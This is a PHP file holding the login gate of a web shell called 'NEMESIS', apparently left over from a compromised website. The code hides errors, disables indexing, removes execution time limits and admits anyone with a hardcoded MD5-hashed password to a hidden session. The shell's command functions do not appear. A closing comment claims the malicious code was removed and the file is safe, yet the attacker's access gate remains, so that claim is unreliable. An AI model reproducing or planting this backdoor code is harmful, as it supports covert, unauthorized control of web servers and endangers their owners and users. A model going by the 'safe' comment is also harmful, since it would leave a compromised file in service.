<?php
session_start();
@error_reporting(0);
@set_time_limit(0);
$hashedPassword = "a89cd49d58980d7b34af9067ed7aa74d"; 
function login_shell($error = '') {

    ?>

    <!DOCTYPE html>

    <html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEMESIS</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>

<body class="bg-gray-900 flex items-center justify-center h-screen">
    <div class="bg-gray-800 p-8 rounded-xl shadow-2xl w-full max-w-sm">
        <div class="text-center mb-8">
            <div class="mx-auto w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center mb-4">
                <i class="fas fa-user-shield text-blue-400 text-2xl"></i>
            </div>
            <h1 class="text-2xl font-bold text-white">NEMESIS</h1>
            <p class="text-gray-400 text-sm mt-1">One day there will come a day when everything will be just a memory.</p>
        </div>

        <form method="POST" class="space-y-5">
            <?php if (!empty($error)): ?>
                <div class="bg-red-500/10 text-red-400 px-4 py-3 rounded-lg border border-red-500/30 flex items-start">
                    <i class="fas fa-exclamation-circle mt-0.5 mr-2"></i>
                    <span><?= htmlspecialchars($error) ?></span>
                </div>
            <?php endif; ?>

            <div class="relative">
                <input type="password" name="password" placeholder=" " 
                    class="w-full px-4 py-3 bg-gray-700/50 border-0 rounded-lg focus:ring-2 focus:ring-blue-500 peer text-white placeholder-transparent"
                    required>
                <label class="absolute left-4 -top-2.5 text-gray-400 text-sm bg-gray-800 px-1 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-500 peer-placeholder-shown:top-3.5 peer-placeholder-shown:bg-transparent transition-all">
                    Enter Password
                </label>
            </div>

            <button type="submit" name="login" 
                class="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white py-3 rounded-lg font-medium transition-all shadow-lg hover:shadow-blue-500/20">
                <i class="fas fa-fingerprint mr-2"></i> Authenticate
            </button>
        </form>

        <div class="mt-6 text-center">
            <p class="text-xs text-gray-500/70">Unauthorized access prohibited</p>
        </div>
    </div>



        <?php if (!empty($error)): ?>

        <script>

            Swal.fire({

                icon: 'error',

                title: 'Login Failed',

                text: '<?= addslashes($error) ?>',

                confirmButtonColor: '#3b82f6',

                background: '#0f172a',

                color: '#e2e8f0',

                timer: 3000

            });

        </script>

        <?php endif; ?>

    </body>

    </html>

    <?php

    exit;

}



$sessionKey = md5($_SERVER['HTTP_HOST']);



if (!isset($_SESSION[$sessionKey])) {

    if (isset($_POST['password'])) {

        if (md5($_POST['password']) === $hashedPassword) {

            $_SESSION[$sessionKey] = true;

        } else {

            login_shell("Invalid password!");

        }

    } else {

        login_shell();

    }

}

?>
<?php

/**
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
 */

